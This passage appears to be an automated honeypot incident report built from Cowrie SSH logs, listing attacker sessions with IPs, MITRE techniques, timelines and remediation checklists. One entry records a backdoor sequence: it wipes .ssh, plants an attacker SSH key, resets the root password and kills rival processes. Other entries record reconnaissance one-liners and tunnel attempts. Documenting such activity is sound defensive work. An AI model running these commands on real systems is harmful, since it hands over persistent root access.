| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:59:08` | `cowrie.session.connect` |
| `2026-07-21 19:59:08` | `cowrie.client.version` |
| `2026-07-21 19:59:08` | `cowrie.client.kex` |
| `2026-07-21 19:59:09` | `cowrie.login.success` |
| `2026-07-21 19:59:10` | `cowrie.session.params` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.success` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:10` | `cowrie.command.input` |
| `2026-07-21 19:59:11` | `cowrie.log.closed` |
| `2026-07-21 19:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c876701c6c17

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:00 |
| **Last Seen** | 2026-07-21 20:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:00:50` | `cowrie.session.connect` |
| `2026-07-21 20:00:50` | `cowrie.client.version` |
| `2026-07-21 20:00:50` | `cowrie.client.kex` |
| `2026-07-21 20:00:52` | `cowrie.login.success` |
| `2026-07-21 20:00:53` | `cowrie.session.params` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.success` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:53` | `cowrie.command.input` |
| `2026-07-21 20:00:54` | `cowrie.log.closed` |
| `2026-07-21 20:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94564f6e97b5

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-07-21 20:01 |
| **Last Seen** | 2026-07-21 20:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:01:54` | `cowrie.session.connect` |
| `2026-07-21 20:01:55` | `cowrie.client.version` |
| `2026-07-21 20:01:55` | `cowrie.client.kex` |
| `2026-07-21 20:01:57` | `cowrie.login.success` |
| `2026-07-21 20:01:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44796729e863

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:02 |
| **Last Seen** | 2026-07-21 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:02:23` | `cowrie.session.connect` |
| `2026-07-21 20:02:23` | `cowrie.client.version` |
| `2026-07-21 20:02:23` | `cowrie.client.kex` |
| `2026-07-21 20:02:24` | `cowrie.login.success` |
| `2026-07-21 20:02:26` | `cowrie.session.params` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.success` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.command.input` |
| `2026-07-21 20:02:26` | `cowrie.log.closed` |
| `2026-07-21 20:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5eff1740f60

| Field | Detail |
|---|---|
| **Source IP** | `120.48.54[.]130` |
| **First Seen** | 2026-07-21 20:02 |
| **Last Seen** | 2026-07-21 20:03 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:DhOW3VfkovL8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:02:36` | `cowrie.session.connect` |
| `2026-07-21 20:02:39` | `cowrie.client.version` |
| `2026-07-21 20:02:39` | `cowrie.client.kex` |
| `2026-07-21 20:02:40` | `cowrie.login.success` |
| `2026-07-21 20:02:41` | `cowrie.session.params` |
| `2026-07-21 20:02:41` | `cowrie.command.input` |
| `2026-07-21 20:02:41` | `cowrie.command.failed` |
| `2026-07-21 20:02:42` | `cowrie.log.closed` |
| `2026-07-21 20:02:43` | `cowrie.session.params` |
| `2026-07-21 20:02:43` | `cowrie.command.input` |
| `2026-07-21 20:02:43` | `cowrie.session.file_download` |
| `2026-07-21 20:02:43` | `cowrie.log.closed` |
| `2026-07-21 20:03:12` | `cowrie.session.params` |
| `2026-07-21 20:03:12` | `cowrie.command.input` |
| `2026-07-21 20:03:12` | `cowrie.log.closed` |
| `2026-07-21 20:03:13` | `cowrie.session.params` |
| `2026-07-21 20:03:13` | `cowrie.command.input` |
| `2026-07-21 20:03:14` | `cowrie.log.closed` |
| `2026-07-21 20:03:15` | `cowrie.session.params` |
| `2026-07-21 20:03:15` | `cowrie.command.input` |
| `2026-07-21 20:03:15` | `cowrie.session.file_download` |
| `2026-07-21 20:03:15` | `cowrie.log.closed` |
| `2026-07-21 20:03:17` | `cowrie.session.params` |
| `2026-07-21 20:03:17` | `cowrie.command.input` |
| `2026-07-21 20:03:17` | `cowrie.log.closed` |
| `2026-07-21 20:03:18` | `cowrie.session.params` |
| `2026-07-21 20:03:18` | `cowrie.command.input` |
| `2026-07-21 20:03:19` | `cowrie.log.closed` |
| `2026-07-21 20:03:20` | `cowrie.session.params` |
| `2026-07-21 20:03:20` | `cowrie.command.input` |
| `2026-07-21 20:03:20` | `cowrie.command.input` |
| `2026-07-21 20:03:20` | `cowrie.log.closed` |
| `2026-07-21 20:03:21` | `cowrie.session.params` |
| `2026-07-21 20:03:21` | `cowrie.command.input` |
| `2026-07-21 20:03:22` | `cowrie.log.closed` |
| `2026-07-21 20:03:24` | `cowrie.session.params` |
| `2026-07-21 20:03:24` | `cowrie.command.input` |
| `2026-07-21 20:03:25` | `cowrie.log.closed` |
| `2026-07-21 20:03:26` | `cowrie.session.params` |
| `2026-07-21 20:03:26` | `cowrie.command.input` |
| `2026-07-21 20:03:27` | `cowrie.log.closed` |
| `2026-07-21 20:03:28` | `cowrie.session.params` |
| `2026-07-21 20:03:28` | `cowrie.command.input` |
| `2026-07-21 20:03:29` | `cowrie.log.closed` |
| `2026-07-21 20:03:29` | `cowrie.session.params` |
| `2026-07-21 20:03:29` | `cowrie.command.input` |
| `2026-07-21 20:03:30` | `cowrie.log.closed` |
| `2026-07-21 20:03:31` | `cowrie.session.params` |
| `2026-07-21 20:03:31` | `cowrie.command.input` |
| `2026-07-21 20:03:31` | `cowrie.log.closed` |
| `2026-07-21 20:03:32` | `cowrie.session.params` |
| `2026-07-21 20:03:32` | `cowrie.command.input` |
| `2026-07-21 20:03:33` | `cowrie.log.closed` |
| `2026-07-21 20:03:34` | `cowrie.session.params` |
| `2026-07-21 20:03:34` | `cowrie.command.input` |
| `2026-07-21 20:03:34` | `cowrie.log.closed` |
| `2026-07-21 20:03:35` | `cowrie.session.params` |
| `2026-07-21 20:03:35` | `cowrie.command.input` |
| `2026-07-21 20:03:36` | `cowrie.log.closed` |
| `2026-07-21 20:03:37` | `cowrie.session.params` |
| `2026-07-21 20:03:37` | `cowrie.command.input` |
| `2026-07-21 20:03:37` | `cowrie.log.closed` |
| `2026-07-21 20:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.54[.]130` to AbuseIPDB if not already reported
- [ ] Block `120.48.54[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1b4c80692ac

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-07-21 20:02 |
| **Last Seen** | 2026-07-21 20:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:02:50` | `cowrie.session.connect` |
| `2026-07-21 20:02:51` | `cowrie.client.version` |
| `2026-07-21 20:02:51` | `cowrie.client.kex` |
| `2026-07-21 20:02:53` | `cowrie.login.success` |
| `2026-07-21 20:02:54` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d19c286fe5e1

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-07-21 20:02 |
| **Last Seen** | 2026-07-21 20:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:02:59` | `cowrie.session.connect` |
| `2026-07-21 20:03:00` | `cowrie.client.version` |
| `2026-07-21 20:03:00` | `cowrie.client.kex` |
| `2026-07-21 20:03:03` | `cowrie.login.success` |
| `2026-07-21 20:03:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7c03b0f203

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:03 |
| **Last Seen** | 2026-07-21 20:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:03:53` | `cowrie.session.connect` |
| `2026-07-21 20:03:54` | `cowrie.client.version` |
| `2026-07-21 20:03:54` | `cowrie.client.kex` |
| `2026-07-21 20:03:55` | `cowrie.login.success` |
| `2026-07-21 20:03:56` | `cowrie.session.params` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.success` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:56` | `cowrie.command.input` |
| `2026-07-21 20:03:57` | `cowrie.log.closed` |
| `2026-07-21 20:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8388d3a33a4f

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]7` |
| **First Seen** | 2026-07-21 20:04 |
| **Last Seen** | 2026-07-21 20:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:04:19` | `cowrie.session.connect` |
| `2026-07-21 20:04:20` | `cowrie.client.version` |
| `2026-07-21 20:04:20` | `cowrie.client.kex` |
| `2026-07-21 20:04:21` | `cowrie.login.success` |
| `2026-07-21 20:04:22` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]7` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-744a95d1da3e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:05 |
| **Last Seen** | 2026-07-21 20:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:05:20` | `cowrie.session.connect` |
| `2026-07-21 20:05:20` | `cowrie.client.version` |
| `2026-07-21 20:05:20` | `cowrie.client.kex` |
| `2026-07-21 20:05:21` | `cowrie.login.success` |
| `2026-07-21 20:05:23` | `cowrie.session.params` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.success` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.command.input` |
| `2026-07-21 20:05:23` | `cowrie.log.closed` |
| `2026-07-21 20:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1baa301d6064

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 20:05 |
| **Last Seen** | 2026-07-21 20:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:05:23` | `cowrie.session.connect` |
| `2026-07-21 20:05:23` | `cowrie.client.version` |
| `2026-07-21 20:05:23` | `cowrie.client.kex` |
| `2026-07-21 20:05:23` | `cowrie.login.success` |
| `2026-07-21 20:05:24` | `cowrie.session.params` |
| `2026-07-21 20:05:24` | `cowrie.command.input` |
| `2026-07-21 20:05:25` | `cowrie.log.closed` |
| `2026-07-21 20:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e353238ea888

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-21 20:06 |
| **Last Seen** | 2026-07-21 20:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:06:18` | `cowrie.session.connect` |
| `2026-07-21 20:06:18` | `cowrie.client.version` |
| `2026-07-21 20:06:18` | `cowrie.client.kex` |
| `2026-07-21 20:06:19` | `cowrie.login.success` |
| `2026-07-21 20:06:19` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdbc807ffbe6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:06 |
| **Last Seen** | 2026-07-21 20:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:06:55` | `cowrie.session.connect` |
| `2026-07-21 20:06:55` | `cowrie.client.version` |
| `2026-07-21 20:06:56` | `cowrie.client.kex` |
| `2026-07-21 20:06:56` | `cowrie.login.success` |
| `2026-07-21 20:06:58` | `cowrie.session.params` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.success` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.command.input` |
| `2026-07-21 20:06:58` | `cowrie.log.closed` |
| `2026-07-21 20:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff79b6029bda

| Field | Detail |
|---|---|
| **Source IP** | `196.203.231[.]220` |
| **First Seen** | 2026-07-21 20:07 |
| **Last Seen** | 2026-07-21 20:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:07:37` | `cowrie.session.connect` |
| `2026-07-21 20:07:38` | `cowrie.client.version` |
| `2026-07-21 20:07:38` | `cowrie.client.kex` |
| `2026-07-21 20:07:39` | `cowrie.login.success` |
| `2026-07-21 20:07:39` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.203.231[.]220` to AbuseIPDB if not already reported
- [ ] Block `196.203.231[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544e94a1cb02

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-21 20:07 |
| **Last Seen** | 2026-07-21 20:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:07:49` | `cowrie.session.connect` |
| `2026-07-21 20:07:49` | `cowrie.client.version` |
| `2026-07-21 20:07:49` | `cowrie.client.kex` |
| `2026-07-21 20:07:50` | `cowrie.login.success` |
| `2026-07-21 20:07:51` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d3c32e70b0a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:08 |
